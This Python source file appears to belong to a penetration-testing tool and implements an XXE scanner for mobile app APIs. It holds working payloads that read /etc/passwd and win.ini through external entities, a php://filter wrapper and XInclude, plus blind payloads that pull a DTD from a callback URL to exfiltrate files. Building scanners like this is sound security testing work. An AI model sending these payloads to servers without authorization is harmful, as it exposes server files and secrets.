"""
Jarwis AGI Pen Test - Mobile XXE (XML External Entity) Scanner

Detects XXE vulnerabilities in mobile app API traffic.
Extends BaseMobileScanner for MITM-first methodology.

OWASP Mobile Top 10 2024: M4 - Insufficient Input/Output Validation
CWE-611: Improper Restriction of XML External Entity Reference

Mobile-specific considerations:
- Many mobile apps use XML for SOAP services, legacy APIs
- Some apps use XML for configuration, data sync
- Financial/enterprise apps often have XML endpoints
- SAML SSO implementations are vulnerable
"""

import asyncio
import logging
import re
import uuid
from typing import Dict, List, Optional, Any

from attacks.mobile.base_mobile_scanner import (
    BaseMobileScanner,
    MobileFinding,
    Severity,
    Confidence
)
from core.mobile_http_client import MobileHTTPClient, MobileAttackResponse
from core.mobile_request_store import MobileRequestStoreDB, StoredMobileRequest

logger = logging.getLogger(__name__)


class MobileXXEScanner(BaseMobileScanner):
    """
    XXE (XML External Entity) Scanner for Mobile APIs
    
    Scans mobile app traffic for XXE vulnerabilities.
    Uses MITM-captured requests to test XML injection points.
    
    Attack vectors:
    - Classic XXE (file disclosure)
    - Blind XXE (OOB data exfiltration)
    - XXE DoS (Billion Laughs)
    - Parameter entity injection
    - XInclude attacks
    """
    
    # Scanner identification
    scanner_name = "mobile_xxe"
    attack_type = "xxe"
    vuln_type = "xxe"
    owasp_category = "M4"  # Insufficient Input/Output Validation
    cwe_id = "CWE-611"
    
    # File paths to read for XXE testing
    TARGET_FILES = {
        'unix': [
            '/etc/passwd',
            '/etc/hostname',
            '/etc/hosts',
        ],
        'windows': [
            'C:/Windows/win.ini',
            'C:/Windows/System32/drivers/etc/hosts',
        ],
    }
    
    # Classic XXE payloads (file disclosure)
    FILE_PAYLOADS = [
        # Basic external entity
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
        
        # Parameter entity
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>''',
        
        # PHP wrapper
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>''',
        
        # Windows file
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>''',
    ]
    
    # XXE Detection payloads (check if XML is parsed)
    DETECTION_PAYLOADS = [
        # Entity reference detection
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY jarwis "XXEDETECTED{canary}">
]>
<root>&jarwis;</root>''',
        
        # CDATA detection
        '''<?xml version="1.0"?>
<root><![CDATA[XXETEST{canary}]]></root>''',
    ]
    
    # Blind XXE payloads (OOB - requires callback server)
    BLIND_PAYLOADS = [
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback_url}/{token}">
  %xxe;
]>
<root>test</root>''',
        
        # Parameterized file read via OOB
        '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{callback_url}/{token}.dtd">
  %dtd;
]>
<root>test</root>''',
    ]
    
    # XInclude payloads (for XML content in other formats)
    XINCLUDE_PAYLOADS = [
        '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>''',
    ]
    
    # XXE success patterns (file content)
    SUCCESS_PATTERNS = [
        r'root:.*:0:0:',  # /etc/passwd
        r'daemon:.*:',
        r'nobody:.*:',
        r'\[fonts\]',  # win.ini
        r'\[extensions\]',
        r'127\.0\.0\.1\s+localhost',  # hosts file
    ]
    
    # XXE error patterns (parser errors indicate XXE might be possible)
    ERROR_PATTERNS = [
        r'XML\s+parsing\s+error',
        r'XMLSyntaxError',
        r'SAXParseException',
        r'ENTITY.*not\s+found',
        r'external\s+entity',
        r'DOCTYPE.*disallowed',
        r'DTD.*not\s+allowed',
        r'entity\s+reference',
        r'lxml\.etree',
        r'XmlException',
    ]
    
    def __init__(
        self,
        http_client: MobileHTTPClient,
        request_store: MobileRequestStoreDB,
        oob_server=None,
        **kwargs
    ):
        """
        Initialize Mobile XXE Scanner.
        
        Args:
            http_client: Mobile HTTP client for attacks
            request_store: Mobile request store
            oob_server: Optional OOB callback server for blind XXE
        """
        super().__init__(http_client, request_store, **kwargs)
        self.oob_server = oob_server
        self.canary = uuid.uuid4().hex[:8]
    
    def get_payloads(self) -> List[str]:
        """Return XXE detection payloads."""
        payloads = [p.format(canary=self.canary) for p in self.DETECTION_PAYLOADS]
        return payloads + self.FILE_PAYLOADS[:2]
    
    def is_applicable(self, request: StoredMobileRequest) -> bool:
        """Check if request might accept XML."""
        # Check content type
        content_type = request.headers.get('content-type', '').lower()
        accept_header = request.headers.get('accept', '').lower()
        
        # XML content type
        if 'xml' in content_type or 'xml' in accept_header:
            return True
        
        # Check if body looks like XML
        if request.body:
            body = request.body.strip()
            if body.startswith('<?xml') or body.startswith('<'):
                return True
        
        # SOAP endpoints
        if 'soap' in request.url.lower():
            return True
        
        # SAML endpoints
        if 'saml' in request.url.lower():
            return True
        
        return False
    
    async def scan_request(self, request: StoredMobileRequest) -> List[MobileFinding]:
        """
        Scan a request for XXE vulnerabilities.
        
        Flow:
        1. Check if request accepts XML
        2. Test XXE detection payloads
        3. Test file disclosure payloads
        4. Test blind XXE if OOB server available
        """
        findings = []
        
        # Get baseline response
        baseline = await self.get_baseline(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] No baseline for {request.url}")
            return findings
        
        # 1. Test detection payloads
        detection_finding = await self._test_xxe_detection(request, baseline)
        if detection_finding:
            findings.append(detection_finding)
        
        # 2. Test file disclosure payloads
        file_finding = await self._test_file_disclosure(request, baseline)
        if file_finding:
            findings.append(file_finding)
        
        # 3. Test XInclude
        xinclude_finding = await self._test_xinclude(request, baseline)
        if xinclude_finding:
            findings.append(xinclude_finding)
        
        return findings
    
    async def _test_xxe_detection(
        self,
        request: StoredMobileRequest,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test if XML entities are parsed."""
        for payload_template in self.DETECTION_PAYLOADS:
            payload = payload_template.format(canary=self.canary)
            
            response = await self.send_payload(
                request,
                payload,
                location="body",
                param_name="xml_body"
            )
            
            if not response:
                continue
            
            response_text = response.body if isinstance(response.body, str) else str(response.body)
            
            # Check for canary in response (entity was resolved)
            if f"XXEDETECTED{self.canary}" in response_text or f"XXETEST{self.canary}" in response_text:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    title="XML Entity Injection Detected",
                    description=(
                        "The application parses XML entities, which may lead to XXE. "
                        f"The entity reference containing '{self.canary}' was resolved "
                        "and appeared in the response. This confirms XML parsing is enabled."
                    ),
                    severity=Severity.HIGH,
                    confidence=Confidence.HIGH
                )
            
            # Check for XXE-related errors
            if self._detect_xxe_error(response_text):
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    title="Possible XXE (XML Parser Error)",
                    description=(
                        "The application returned an XML parser error, indicating "
                        "that XML is processed. Further testing may reveal XXE vulnerability."
                    ),
                    severity=Severity.MEDIUM,
                    confidence=Confidence.MEDIUM
                )
        
        return None
    
    async def _test_file_disclosure(
        self,
        request: StoredMobileRequest,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for file disclosure via XXE."""
        for payload in self.FILE_PAYLOADS:
            response = await self.send_payload(
                request,
                payload,
                location="body",
                param_name="xml_body"
            )
            
            if not response:
                continue
            
            response_text = response.body if isinstance(response.body, str) else str(response.body)
            
            # Check for file content
            for pattern in self.SUCCESS_PATTERNS:
                if re.search(pattern, response_text, re.IGNORECASE):
                    # Determine which file was read
                    file_read = "/etc/passwd" if "passwd" in payload else "system file"
                    if "win.ini" in payload:
                        file_read = "C:/Windows/win.ini"
                    
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        title="XXE File Disclosure",
                        description=(
                            f"The application is vulnerable to XXE with file disclosure. "
                            f"The contents of '{file_read}' were successfully read via "
                            "an external entity reference. This allows reading arbitrary "
                            "server files including configuration and secrets."
                        ),
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH
                    )
        
        return None
    
    async def _test_xinclude(
        self,
        request: StoredMobileRequest,
        baseline: MobileAttackResponse
    ) -> Optional[MobileFinding]:
        """Test for XInclude injection."""
        for payload in self.XINCLUDE_PAYLOADS:
            response = await self.send_payload(
                request,
                payload,
                location="body",
                param_name="xml_body"
            )
            
            if not response:
                continue
            
            response_text = response.body if isinstance(response.body, str) else str(response.body)
            
            for pattern in self.SUCCESS_PATTERNS:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        title="XInclude Injection",
                        description=(
                            "The application is vulnerable to XInclude injection. "
                            "File contents were included via xi:include directive. "
                            "This can be used for file disclosure even when DTDs are disabled."
                        ),
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH
                    )
        
        return None
    
    def _detect_xxe_error(self, response_text: str) -> bool:
        """Detect XXE-related parser errors."""
        for pattern in self.ERROR_PATTERNS:
            try:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            except re.error:
                continue
        return False
